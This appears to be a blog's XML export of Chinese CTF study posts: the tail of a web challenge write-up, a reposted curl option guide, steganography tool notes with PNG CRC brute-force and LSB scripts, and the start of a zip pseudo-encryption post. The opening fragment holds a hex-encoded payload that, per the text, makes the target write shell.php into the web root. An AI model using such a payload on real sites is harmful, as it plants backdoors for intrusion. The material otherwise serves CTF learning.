class="number">30412532343325</span><span class="number">30442530417365</span><span class="number">74253044253041</span><span class="number">25323431302530</span><span class="number">44253041646266</span>696c656e616d<span class="number">65253044253041</span><span class="number">25323439253044</span><span class="number">253041736865</span>6c6c2e<span class="number">70687025304425</span><span class="number">30412532413125</span><span class="number">30442530412532</span><span class="number">34342530442530</span><span class="number">41736176652530</span><span class="number">44253041253041</span>);</span><br></pre></td></tr></table></figure>
<p>payload打过去之后，访问/linp.php?id=6 ,就会在网站根目录生成shell.php</p>
<img src="http://img.npfs06.top/20211015202659.png" style="zoom:80%;">

<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://blog.csdn.net/miuzzx/article/details/112522873">https://blog.csdn.net/miuzzx/article/details/112522873</a></p>
]]></content>
      <categories>
        <category>web入门</category>
      </categories>
  </entry>
  <entry>
    <title>curl用法</title>
    <url>/2021/02/28/curl%E7%94%A8%E6%B3%95/</url>
    <content><![CDATA[<p>curl 常见用法指南</p>
<a id="more"></a>

<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>curl 是常用的命令行工具，用来请求 Web 服务器。它的名字就是客户端（client）的 URL 工具的意思。</p>
<p>它的功能非常强大，命令行参数多达几十种。如果熟练的话，完全可以取代 Postman 这一类的图形界面工具。</p>
<p><img src="http://img.npfs06.top/20210227102545.jpeg?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>本文介绍它的主要命令行参数，作为日常的参考，方便查阅。为了节约篇幅，下面的例子不包括运行时的输出</p>
<p>不带有任何参数时，curl 就是发出 GET 请求。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ curl https://www.example.com</span><br></pre></td></tr></table></figure>
<p>上面命令向 <code>www.example.com</code> 发出 GET 请求，服务器返回的内容会在命令行输出。</p>
<h2 id="A"><a href="#A" class="headerlink" title="-A"></a><strong>-A</strong></h2><p><code>-A</code>参数指定客户端的用户代理标头，即<code>User-Agent</code>。curl 的默认用户代理字符串是<code>curl/[version]</code>。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ curl -A <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36&#x27;</span> https://google.com</span><br></pre></td></tr></table></figure>
<p>上面命令将<code>User-Agent</code>改成 Chrome 浏览器。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ curl -A <span class="string">&#x27;&#x27;</span> https://google.com</span><br></pre></td></tr></table></figure>
<p>上面命令会移除<code>User-Agent</code>标头。</p>
<p>也可以通过<code>-H</code>参数直接指定标头，更改<code>User-Agent</code>。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ curl -H <span class="string">&#x27;User-Agent: php/1.0&#x27;</span> https://google.com</span><br></pre></td></tr></table></figure>
<h2 id="b"><a href="#b" class="headerlink" title="-b"></a><strong>-b</strong></h2><p><code>-b</code>参数用来向服务器发送 Cookie。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ curl -b <span class="string">&#x27;foo=bar&#x27;</span> https://google.com</span><br></pre></td></tr></table></figure>
<p>上面命令会生成一个标头<code>Cookie: foo=bar</code>，向服务器发送一个名为<code>foo</code>、值为<code>bar</code>的 Cookie。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ curl -b <span class="string">&#x27;foo1=bar;foo2=bar2&#x27;</span> https://google.com</span><br></pre></td></tr></table></figure>
<p>上面命令发送两个 Cookie。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ curl -b cookies.txt https://www.google.com</span><br></pre></td></tr></table></figure>
<p>上面命令读取本地文件<code>cookies.txt</code>，里面是服务器设置的 Cookie（参见<code>-c</code>参数），将其发送到服务器。</p>
<h2 id="c"><a href="#c" class="headerlink" title="-c"></a><strong>-c</strong></h2><p><code>-c</code>参数将服务器设置的 Cookie 写入一个文件。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ curl -c cookies.txt https://www.google.com</span><br></pre></td></tr></table></figure>
<p>上面命令将服务器的 HTTP 回应所设置 Cookie 写入文本文件<code>cookies.txt</code>。</p>
<h2 id="d"><a href="#d" class="headerlink" title="-d"></a><strong>-d</strong></h2><p><code>-d</code>参数用于发送 POST 请求的数据体。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"> $ curl -d<span class="string">&#x27;login=emma＆password=123&#x27;</span>-X POST https://google.com/login</span><br><span class="line"> <span class="comment"># 或者</span></span><br><span class="line">$ curl -d <span class="string">&#x27;login=emma&#x27;</span> -d <span class="string">&#x27;password=123&#x27;</span> -X POST  https://google.com/login</span><br></pre></td></tr></table></figure>
<p>使用<code>-d</code>参数以后，HTTP 请求会自动加上标头<code>Content-Type : application/x-www-form-urlencoded</code>。并且会自动将请求转为 POST 方法，因此可以省略<code>-X POST</code>。</p>
<p><code>-d</code>参数可以读取本地文本文件的数据，向服务器发送。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ curl -d <span class="string">&#x27;@data.txt&#x27;</span> https://google.com/login</span><br></pre></td></tr></table></figure>
<p>上面命令读取<code>data.txt</code>文件的内容，作为数据体向服务器发送。</p>
<h2 id="–data-urlencode"><a href="#–data-urlencode" class="headerlink" title="–data-urlencode"></a><strong>–data-urlencode</strong></h2><p><code>--data-urlencode</code>参数等同于<code>-d</code>，发送 POST 请求的数据体，区别在于会自动将发送的数据进行 URL 编码。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ curl --data-urlencode <span class="string">&#x27;comment=hello world&#x27;</span> https://google.com/login</span><br></pre></td></tr></table></figure>
<p>上面代码中，发送的数据<code>hello world</code>之间有一个空格，需要进行 URL 编码。</p>
<h2 id="e"><a href="#e" class="headerlink" title="-e"></a><strong>-e</strong></h2><p><code>-e</code>参数用来设置 HTTP 的标头<code>Referer</code>，表示请求的来源。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -e <span class="string">&#x27;https://google.com?q=example&#x27;</span> https://www.example.com</span><br></pre></td></tr></table></figure>
<p>上面命令将<code>Referer</code>标头设为<code>https://google.com?q=example</code>。</p>
<p><code>-H</code>参数可以通过直接添加标头<code>Referer</code>，达到同样效果。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -H <span class="string">&#x27;Referer: https://google.com?q=example&#x27;</span> https://www.example.com</span><br></pre></td></tr></table></figure>
<h2 id="F"><a href="#F" class="headerlink" title="-F"></a><strong>-F</strong></h2><p><code>-F</code>参数用来向服务器上传二进制文件。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ curl -F <span class="string">&#x27;file=@photo.png&#x27;</span> https://google.com/profile</span><br></pre></td></tr></table></figure>
<p>上面命令会给 HTTP 请求加上标头<code>Content-Type: multipart/form-data</code>，然后将文件<code>photo.png</code>作为<code>file</code>字段上传。</p>
<p><code>-F</code>参数可以指定 MIME 类型。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ curl -F <span class="string">&#x27;file=@photo.png;type=image/png&#x27;</span> https://google.com/profile</span><br></pre></td></tr></table></figure>
<p>上面命令指定 MIME 类型为<code>image/png</code>，否则 curl 会把 MIME 类型设为<code>application/octet-stream</code>。</p>
<p><code>-F</code>参数也可以指定文件名。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ curl -F <span class="string">&#x27;file=@photo.png;filename=me.png&#x27;</span> https://google.com/profile</span><br></pre></td></tr></table></figure>
<p>上面命令中，原始文件名为<code>photo.png</code>，但是服务器接收到的文件名为<code>me.png</code>。</p>
<h2 id="G"><a href="#G" class="headerlink" title="-G"></a><strong>-G</strong></h2><p><code>-G</code>参数用来构造 URL 的查询字符串。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ curl -G -d <span class="string">&#x27;q=kitties&#x27;</span> -d <span class="string">&#x27;count=20&#x27;</span> https://google.com/search</span><br></pre></td></tr></table></figure>
<p>上面命令会发出一个 GET 请求，实际请求的 URL 为<code>https://google.com/search?q=kitties&amp;count=20</code>。如果省略<code>--G</code>，会发出一个 POST 请求。</p>
<p>如果数据需要 URL 编码，可以结合<code>--data--urlencode</code>参数。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ curl -G --data-urlencode <span class="string">&#x27;comment=hello world&#x27;</span> https://www.example.com</span><br></pre></td></tr></table></figure>
<h2 id="H"><a href="#H" class="headerlink" title="-H"></a><strong>-H</strong></h2><p><code>-H</code>参数添加 HTTP 请求的标头。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ curl -H <span class="string">&#x27;Accept-Language: en-US&#x27;</span> https://google.com</span><br></pre></td></tr></table></figure>
<p>上面命令添加 HTTP 标头<code>Accept-Language: en-US</code>。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ curl -H <span class="string">&#x27;Accept-Language: en-US&#x27;</span> -H <span class="string">&#x27;Secret-Message: xyzzy&#x27;</span> https://google.com</span><br></pre></td></tr></table></figure>
<p>上面命令添加两个 HTTP 标头。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ curl -d <span class="string">&#x27;&#123;&quot;login&quot;: &quot;emma&quot;, &quot;pass&quot;: &quot;123&quot;&#125;&#x27;</span> -H <span class="string">&#x27;Content-Type: application/json&#x27;</span> https://google.com/login</span><br></pre></td></tr></table></figure>
<p>上面命令添加 HTTP 请求的标头是<code>Content-Type: application/json</code>，然后用<code>-d</code>参数发送 JSON 数据。</p>
<h2 id="i"><a href="#i" class="headerlink" title="-i"></a><strong>-i</strong></h2><p><code>-i</code>参数打印出服务器回应的 HTTP 标头。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ curl -i https://www.example.com</span><br></pre></td></tr></table></figure>
<p>上面命令收到服务器回应后，先输出服务器回应的标头，然后空一行，再输出网页的源码。</p>
<h2 id="I"><a href="#I" class="headerlink" title="-I"></a><strong>-I</strong></h2><p><code>-I</code>参数向服务器发出 HEAD 请求，然会将服务器返回的 HTTP 标头打印出来。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ curl -I https://www.example.com</span><br></pre></td></tr></table></figure>
<p>上面命令输出服务器对 HEAD 请求的回应。</p>
<p><code>--head</code>参数等同于<code>-I</code>。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ curl --head https://www.example.com</span><br></pre></td></tr></table></figure>
<h2 id="k"><a href="#k" class="headerlink" title="-k"></a><strong>-k</strong></h2><p><code>-k</code>参数指定跳过 SSL 检测。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ curl -k https://www.example.com</span><br></pre></td></tr></table></figure>
<p>上面命令不会检查服务器的 SSL 证书是否正确。</p>
<h2 id="L"><a href="#L" class="headerlink" title="-L"></a><strong>-L</strong></h2><p><code>-L</code>参数会让 HTTP 请求跟随服务器的重定向。curl 默认不跟随重定向。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ curl -L -d <span class="string">&#x27;tweet=hi&#x27;</span> https://api.twitter.com/tweet</span><br></pre></td></tr></table></figure>
<h2 id="–limit-rate"><a href="#–limit-rate" class="headerlink" title="–limit-rate"></a><strong>–limit-rate</strong></h2><p><code>--limit-rate</code>用来限制 HTTP 请求和回应的带宽，模拟慢网速的环境。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ curl --limit-rate 200k https://google.com</span><br></pre></td></tr></table></figure>
<p>上面命令将带宽限制在每秒 200K 字节。</p>
<h2 id="o"><a href="#o" class="headerlink" title="-o"></a><strong>-o</strong></h2><p><code>-o</code>参数将服务器的回应保存成文件，等同于<code>wget</code>命令。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ curl -o example.html https://www.example.com</span><br></pre></td></tr></table></figure>
<p>上面命令将<code>www.example.com</code>保存成<code>example.html</code>。</p>
<h2 id="O"><a href="#O" class="headerlink" title="-O"></a><strong>-O</strong></h2><p><code>-O</code>参数将服务器回应保存成文件，并将 URL 的最后部分当作文件名。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ curl -O https://www.example.com/foo/bar.html</span><br></pre></td></tr></table></figure>
<p>上面命令将服务器回应保存成文件，文件名为<code>bar.html</code>。</p>
<h2 id="s"><a href="#s" class="headerlink" title="-s"></a>-s</h2><p><code>-s</code>参数将不输出错误和进度信息。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ curl -s https://www.example.com</span><br></pre></td></tr></table></figure>
<p>上面命令一旦发生错误，不会显示错误信息。不发生错误的话，会正常显示运行结果。</p>
<p>如果想让 curl 不产生任何输出，可以使用下面的命令。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ curl -s -o /dev/null https://google.com</span><br></pre></td></tr></table></figure>
<h2 id="S"><a href="#S" class="headerlink" title="-S"></a><strong>-S</strong></h2><p><code>-S</code>参数指定只输出错误信息，通常与<code>-s</code>一起使用。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ curl -s -o /dev/null https://google.com</span><br></pre></td></tr></table></figure>
<p>上面命令没有任何输出，除非发生错误。</p>
<h2 id="T"><a href="#T" class="headerlink" title="-T"></a>-T</h2><p> <code>-T</code>  参数指定请求体文件</p>
<h2 id="u"><a href="#u" class="headerlink" title="-u"></a>-u</h2><p><code>-u</code>参数用来设置服务器认证的用户名和密码。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ curl -u <span class="string">&#x27;bob:12345&#x27;</span> https://google.com/login</span><br></pre></td></tr></table></figure>
<p>上面命令设置用户名为<code>bob</code>，密码为<code>12345</code>，然后将其转为 HTTP 标头<code>Authorization: Basic Ym9iOjEyMzQ1</code>。</p>
<p>curl 能够识别 URL 里面的用户名和密码。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ curl https://bob:12345@google.com/login</span><br></pre></td></tr></table></figure>
<p>上面命令能够识别 URL 里面的用户名和密码，将其转为上个例子里面的 HTTP 标头。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ curl -u <span class="string">&#x27;bob&#x27;</span> https://google.com/login</span><br></pre></td></tr></table></figure>
<p>上面命令只设置了用户名，执行后，curl 会提示用户输入密码。</p>
<h2 id="x"><a href="#x" class="headerlink" title="-x"></a><strong>-x</strong></h2><p><code>-x</code>参数指定 HTTP 请求的代理。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ curl -x socks5://james:cats@myproxy.com:8080 https://www.example.com</span><br></pre></td></tr></table></figure>
<p>上面命令指定 HTTP 请求通过<code>myproxy.com:8080</code>的 socks5 代理发出。</p>
<p>如果没有指定代理协议，默认为 HTTP。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ curl -x james:cats@myproxy.com:8080 https://www.example.com</span><br></pre></td></tr></table></figure>
<p>上面命令中，请求的代理使用 HTTP 协议。</p>
<figure class="highlight less"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">--resolve</span> <span class="selector-tag">HOST</span>:<span class="selector-tag">PORT</span>:<span class="selector-tag">ADDRESS</span>  将 <span class="selector-tag">HOST</span>:<span class="selector-tag">PORT</span> 强制解析到 <span class="selector-tag">ADDRESS</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="X"><a href="#X" class="headerlink" title="-X"></a>-X</h2><p><code>-X</code>参数指定 HTTP 请求的方法。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ curl -X POST https://www.example.com</span><br></pre></td></tr></table></figure>
<p>上面命令对<code>https://www.example.com</code>发出 POST 请求。</p>
<hr>
<p>转载自 <a href="https://www.ruanyifeng.com/blog/2019/09/curl-reference.html">https://www.ruanyifeng.com/blog/2019/09/curl-reference.html</a></p>
]]></content>
      <categories>
        <category>share</category>
        <category>linux</category>
      </categories>
  </entry>
  <entry>
    <title>day1 misc(相关工具命令)</title>
    <url>/2020/05/15/day1-misc-%E7%9B%B8%E5%85%B3%E5%B7%A5%E5%85%B7%E5%91%BD%E4%BB%A4/</url>
    <content><![CDATA[<p>misc第一天学习记录<a id="more"></a></p>
<h2 id="文件后缀名判断"><a href="#文件后缀名判断" class="headerlink" title="文件后缀名判断"></a>文件后缀名判断</h2><p>1.file命令</p>
<p>2.hex查看文件头</p>
<h2 id="文件分离"><a href="#文件分离" class="headerlink" title="文件分离"></a>文件分离</h2><h3 id="binwalk"><a href="#binwalk" class="headerlink" title="binwalk"></a>binwalk</h3><p>分析文件：<code>binwalk filename</code><br>分离文件：<code>binwalk -e filename</code></p>
<p>遇到压缩包会自动解压</p>
<h3 id="foremost"><a href="#foremost" class="headerlink" title="foremost"></a>foremost</h3><p>分离文件：<code>foremost filename -o 输出文件名</code></p>
<h3 id="dd"><a href="#dd" class="headerlink" title="dd"></a>dd</h3><p><code>dd if=源文件 of=目标文件名 bs=读写块的大写  count= 取的块数 skip=开始分离的字节数</code></p>
<p><a href="<https://www.runoob.com/linux/linux-comm-dd.html>" target="_blank">linux dd命令</a></p>
<h3 id="十六进制编辑器手动分离"><a href="#十六进制编辑器手动分离" class="headerlink" title="十六进制编辑器手动分离"></a>十六进制编辑器手动分离</h3><p>o10editor  winhex</p>
<h2 id="文件合并"><a href="#文件合并" class="headerlink" title="文件合并"></a>文件合并</h2><h3 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h3><p>cat 合并的文件 &gt;输出的文件</p>
<p>完整性检测</p>
<p>md5sum 文件名</p>
<h3 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h3><p>copy /B 合并的文件(+) 输出的文件命令</p>
<p>完整性检测</p>
<p>certutil -hashfile 文件名 md5</p>
<h2 id="图片隐写"><a href="#图片隐写" class="headerlink" title="图片隐写"></a>图片隐写</h2><h3 id="1-细微的颜色差别"><a href="#1-细微的颜色差别" class="headerlink" title="1.细微的颜色差别"></a>1.细微的颜色差别</h3><h3 id="2-GIF图多帧隐藏"><a href="#2-GIF图多帧隐藏" class="headerlink" title="2.GIF图多帧隐藏"></a>2.GIF图多帧隐藏</h3><p>​    a.颜色通道隐藏<br>​        b.不同帧图信息隐藏<br>​        c.不同帧对比隐写</p>
<h3 id="3-exif信息隐藏"><a href="#3-exif信息隐藏" class="headerlink" title="3.exif信息隐藏"></a>3.exif信息隐藏</h3><h3 id="4-图片修复"><a href="#4-图片修复" class="headerlink" title="4.图片修复"></a>4.图片修复</h3><p>​     a.图片头修复<br>​     b.图片尾修复<br>​     c.CRC校验<br>​     d.长宽高修复<br>​     </p>
<h3 id="5-最低有效位LSB隐写"><a href="#5-最低有效位LSB隐写" class="headerlink" title="5.最低有效位LSB隐写"></a>5.最低有效位LSB隐写</h3><h3 id="6-图片加密"><a href="#6-图片加密" class="headerlink" title="6.图片加密"></a>6.图片加密</h3><p>​     a.stegdelect<br>​     b.outguess<br>​     c.jphide<br>​     d.F5</p>
<h3 id="7-工具"><a href="#7-工具" class="headerlink" title="7.工具"></a>7.工具</h3><h4 id="Firework"><a href="#Firework" class="headerlink" title="Firework"></a>Firework</h4><p>使用winhex打开文件看到文件头部包含firework标识，通过firework找到隐藏信息（类似PS）</p>
<h4 id="Exif"><a href="#Exif" class="headerlink" title="Exif"></a>Exif</h4><p>图片右键 -&gt;属性</p>
<p>linux下<code>$exiftool 文件名</code></p>
<h4 id="stegsolve"><a href="#stegsolve" class="headerlink" title="stegsolve"></a>stegsolve</h4><p>两种相同图片–&gt;  Image combiner</p>
<p>lsb(最低有效位)  –&gt;详见 图片文件隐写 -LSB  （文章下面）</p>
<h4 id="TweakPNG"><a href="#TweakPNG" class="headerlink" title="TweakPNG"></a>TweakPNG</h4><p>文件头正常却无法正常打开文件，tweakpng会弹出校验错误的提示（CRC）</p>
<p>再利用十六进制编辑器进行更改即可，若更改后还是无法正常打开，可退出为宽高被修改了</p>
<p><a href="https://www.cnblogs.com/NPFS/p/12834774.html" target="_blank">宽高爆破脚本</a></p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">import</span> struct</span><br><span class="line"><span class="attribute">import</span> binascii</span><br><span class="line"><span class="attribute">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="attribute">m</span> = open(<span class="string">&quot;flag.png&quot;</span>, <span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line"><span class="attribute">k</span> = <span class="number">0</span></span><br><span class="line"><span class="attribute">for</span> i in range(<span class="number">5000</span>):</span><br><span class="line">    <span class="attribute">if</span> k == <span class="number">1</span>:</span><br><span class="line">        <span class="attribute">break</span></span><br><span class="line">    <span class="attribute">for</span> j in range(<span class="number">5000</span>):</span><br><span class="line">        <span class="attribute">c</span> = m[<span class="number">12</span>:<span class="number">16</span>] + struct.pack(&#x27;&gt;i&#x27;, i) + struct.pack(&#x27;&gt;i&#x27;, j) + m[<span class="number">24</span>:<span class="number">29</span>]</span><br><span class="line">        <span class="attribute">crc</span> = binascii.crc<span class="number">32</span>(c) &amp; <span class="number">0</span>xffffffff</span><br><span class="line">        <span class="attribute">if</span> crc == <span class="number">0</span>x<span class="number">889</span>c<span class="number">2</span>f<span class="number">07</span>:</span><br><span class="line">            <span class="attribute">k</span> = <span class="number">1</span></span><br><span class="line">            <span class="attribute">print</span>(hex(i), hex(j))</span><br><span class="line">            <span class="attribute">break</span></span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="comment">#读文件</span></span><br><span class="line">file = <span class="string">&#x27;1.png&#x27;</span>  <span class="comment">#注意，1.png图片要和脚本在同一个文件夹下哦~</span></span><br><span class="line">fr = <span class="built_in">open</span>(file,<span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line">data = <span class="built_in">bytearray</span>(fr[<span class="number">12</span>:<span class="number">29</span>])</span><br><span class="line">crc32key = <span class="built_in">eval</span>(<span class="built_in">str</span>(fr[<span class="number">29</span>:<span class="number">33</span>]).replace(<span class="string">&#x27;\\x&#x27;</span>,<span class="string">&#x27;&#x27;</span>).replace(<span class="string">&quot;b&#x27;&quot;</span>,<span class="string">&#x27;0x&#x27;</span>).replace(<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&#x27;&#x27;</span>))</span><br><span class="line"><span class="comment">#crc32key = 0xCBD6DF8A #补上0x，copy hex value</span></span><br><span class="line"><span class="comment">#data = bytearray(b&#x27;\x49\x48\x44\x52\x00\x00\x01\xF4\x00\x00\x01\xF1\x08\x06\x00\x00\x00&#x27;)  #hex下copy grep hex</span></span><br><span class="line">n = <span class="number">4095</span> <span class="comment">#理论上0xffffffff,但考虑到屏幕实际，0x0fff就差不多了</span></span><br><span class="line"><span class="keyword">for</span> w <span class="keyword">in</span> <span class="built_in">range</span>(n):<span class="comment">#高和宽一起爆破</span></span><br><span class="line">    width = <span class="built_in">bytearray</span>(struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>, w))<span class="comment">#q为8字节，i为4字节，h为2字节</span></span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        height = <span class="built_in">bytearray</span>(struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>, h))</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">            data[x+<span class="number">4</span>] = width[x]</span><br><span class="line">            data[x+<span class="number">8</span>] = height[x]</span><br><span class="line">            <span class="comment">#print(data)</span></span><br><span class="line">        crc32result = zlib.crc32(data)</span><br><span class="line">        <span class="keyword">if</span> crc32result == crc32key:</span><br><span class="line">            print(width,height)</span><br><span class="line">            <span class="comment">#写文件</span></span><br><span class="line">            newpic = <span class="built_in">bytearray</span>(fr)</span><br><span class="line">            <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">                newpic[x+<span class="number">16</span>] = width[x]</span><br><span class="line">                newpic[x+<span class="number">20</span>] = height[x]</span><br><span class="line">            fw = <span class="built_in">open</span>(file+<span class="string">&#x27;.png&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>)<span class="comment">#保存副本</span></span><br><span class="line">            fw.write(newpic)</span><br><span class="line">            fw.close</span><br></pre></td></tr></table></figure>
<h4 id="Bftools-用于解密图片信息"><a href="#Bftools-用于解密图片信息" class="headerlink" title="Bftools(用于解密图片信息)"></a>Bftools(用于解密图片信息)</h4><p>在windowsd的cmd下，对加密的图片进行解密</p>
<p><code>Bftools.exe decode braincopter 要解密的图片名 -output 输出文件名</code></p>
<p><code>Bftools.exe run  上一步输出的文件</code></p>
<h4 id="SilenEye"><a href="#SilenEye" class="headerlink" title="SilenEye"></a>SilenEye</h4><p>用于将文字或文件隐藏到图片的解密工具</p>
<h4 id="Stegdetect"><a href="#Stegdetect" class="headerlink" title="Stegdetect"></a>Stegdetect</h4><p>用于探测JPG图像加密方式,例如 JSteg,JPHide,OutGuess,Fs等</p>
<p><code>stegdetect xxx.jpg</code></p>
<p><code>stegdetect -s 敏感度 xxx.jpg</code></p>
<blockquote>
<p>JPHide利用jphs解密<br>OutGuess利用outguess工具解密，该工具需要编译使用./configure&amp;&amp;make&amp;&amp;make install 使用<code>outguess -r 文件名</code></p>
<p>F5利用F5工具解密，进入F5-stegdetect_F5目录，将图片复制到该目录，并CMD打开目录</p>
<p><code>Java Extract 解密文件  -p 密码</code></p>
</blockquote>
<h4 id="QR-二维码处理"><a href="#QR-二维码处理" class="headerlink" title="QR(二维码处理)"></a>QR(二维码处理)</h4><h2 id="图片文件隐写-LSB"><a href="#图片文件隐写-LSB" class="headerlink" title="图片文件隐写 -LSB"></a>图片文件隐写 -LSB</h2><h3 id="1-RGB"><a href="#1-RGB" class="headerlink" title="1.RGB"></a>1.RGB</h3><h3 id="2-通过修改像素中最低位的1bit达到隐藏效果"><a href="#2-通过修改像素中最低位的1bit达到隐藏效果" class="headerlink" title="2.通过修改像素中最低位的1bit达到隐藏效果"></a>2.通过修改像素中最低位的1bit达到隐藏效果</h3><h3 id="3-工具"><a href="#3-工具" class="headerlink" title="3.工具"></a>3.工具</h3><h4 id="stegsolve-1"><a href="#stegsolve-1" class="headerlink" title="stegsolve"></a>stegsolve</h4><p>打开文件&gt;&gt;Analyse&gt;&gt;Data Extract &gt;&gt;调整bit planes,bit order,bit plane order(多次尝试)&gt;&gt;preview</p>
<h4 id="zsteg"><a href="#zsteg" class="headerlink" title="zsteg"></a>zsteg</h4><p>适应PNG&amp;BMP</p>
<p>installation <code>gem install zsteg</code></p>
<p>method   <code>zsteg xxx.png</code> </p>
<h4 id="wbstego4-解密"><a href="#wbstego4-解密" class="headerlink" title="wbstego4(解密)"></a>wbstego4(解密)</h4><p>适应BMP&amp;PDF&amp;HTML&amp;TXT</p>
<h4 id="py脚本"><a href="#py脚本" class="headerlink" title="py脚本"></a>py脚本</h4><p>method: <code>python LSB.py</code></p>
<figure class="highlight processing"><table><tr><td class="code"><pre><span class="line">LSB.py</span><br><span class="line">#coding:utf<span class="number">-8</span></span><br><span class="line"><span class="keyword">import</span> PIL.Image</span><br><span class="line">def foo():</span><br><span class="line">	im=PIL.Image.<span class="built_in">open</span>(<span class="string">&#x27;01.bmp&#x27;</span>)</span><br><span class="line">	im2 = im.<span class="built_in">copy</span>()</span><br><span class="line">	pix = im2.load()</span><br><span class="line">	<span class="built_in">width</span>,heigth = im2.<span class="built_in">size</span></span><br><span class="line">	</span><br><span class="line">	<span class="keyword">for</span> x in xrange(<span class="number">0</span>,<span class="built_in">width</span>):</span><br><span class="line">		<span class="keyword">for</span> y in xrange(<span class="number">0</span>,<span class="built_in">height</span>):</span><br><span class="line">			<span class="keyword">if</span> pix[x,y]&amp;<span class="number">0x1</span> == <span class="number">0</span>:</span><br><span class="line">				pix[x,y] = <span class="number">0</span></span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">				pix[x,y]=<span class="number">255</span></span><br><span class="line">		im2.show()</span><br><span class="line">		pass</span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">	foo()</span><br><span class="line">	<span class="built_in">print</span> <span class="string">&#x27;ok&#x27;</span></span><br><span class="line">	pass</span><br></pre></td></tr></table></figure>




]]></content>
      <categories>
        <category>misc</category>
      </categories>
  </entry>
  <entry>
    <title>day2 misc(压缩包)</title>
    <url>/2020/05/16/day2-misc-%E5%8E%8B%E7%BC%A9%E5%8C%85/</url>
    <content><![CDATA[<p><strong>伪加密、爆破、明文攻击、碰撞</strong><a id="more"></a></p>
<p>zip文件格式：</p>
<p>zip文件由三部分组成：压缩的文件内容源数据、压缩的目录元数据、目录结束标识结构 </p>
<h1 id="zip伪加密"><a href="#zip伪加密" class="headerlink" title="zip伪加密"></a>zip伪加密</h1><p><img src="https://img.npfs06.top/20210325154123.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"> </p>
<p>若是没有加密的zip文件，两处标记都是00 00</p>
